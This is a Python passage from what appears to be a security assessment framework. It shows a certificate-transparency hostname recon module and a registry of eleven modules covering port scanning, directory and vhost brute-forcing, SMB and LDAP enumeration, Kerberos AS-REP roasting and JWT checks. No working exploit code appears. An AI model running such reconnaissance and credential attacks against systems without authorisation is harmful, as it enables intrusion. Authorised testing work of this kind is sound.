                     evidence="\n".join(found[:60]),
                     tags=["ct", "recon", "subdomains"],
                     description="Hostnames from certificate transparency "
                                 "logs for the assessed domain.",
                     remediation="Review unintended hostname exposure.",
                     raw={"domain": domain, "count": len(found)})
        logger.info(f"ct {domain}: {len(found)} hostname(s)")
        return {"module": self.id, "mode": "exec", "domain": domain,
                "count": len(found), "hostnames": found}


PACK4 = [
    NmapServiceScan(),
    NucleiScan(),
    GobusterContentEnum(),
    SmbShareEnum(),
    KerberosAsrepRoast(),
    LdapAdEnum(),
    JwtActiveCheck(),
    GitExposureCheck(),
    EndpointDiffFuzzer(),
    VhostBruteforce(),
    CertTransparency(),
]
